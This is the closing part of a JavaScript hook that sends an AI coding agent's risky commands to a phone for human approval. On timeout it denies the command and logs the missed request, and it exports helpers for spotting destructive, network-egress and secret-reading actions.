      if (state.status === 'gone') { why = 'the bridge restarted before this was answered'; break; }
    } catch (e) {
      // transient poll failure, keep trying until deadline
    }
    if (Date.now() - asked < 1000) await sleep(POLL_MS);
  }
  // Recorded so the phone's "Needs your tap" card can offer it again later; a
  // timed-out push or merge otherwise just disappears. Best-effort, never blocks.
  if (missedLabel) {
    try {
      await fetch(`${BASE}/api/ask/missed?token=${token}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id, command, cwd: cwd || null, question: missedLabel }),
        signal: AbortSignal.timeout(5000),
      });
    } catch (e) {
      // bridge gone: the deny still stands
    }
  }
  return { allow: false, reason: why };
}

// Guarded so test/smoke.js can require this file for MUTATING_GIT without the
// hook trying to read a hook payload off stdin.
if (require.main === module) {
  main().catch(() => decide('deny', 'relay hook error'));
}

module.exports = {
  MUTATING_GIT, RISKY_GIT, isRiskyGit, DESTRUCTIVE_FS, NETWORK_EGRESS, RELAY_RULES,
  RELAYED_TOOLS, ATTENDED_MODES, shouldRelay, matchRelayRule, isLoopbackOnly, isUnattended,
  enabledRules, baseUrl,
  FETCH_TOOLS, TAINT_TOOLS, isLocalHost, outboundHosts, isSecretEgress, isDataBearingUrl,
  taintSource, readsSecret, matchTaintRule, readTaint, updateTaint, TAINT_DIR,
  privateMergeTarget, isPrivateRepoMerge, privateMergePasses,
  askPhone,
};
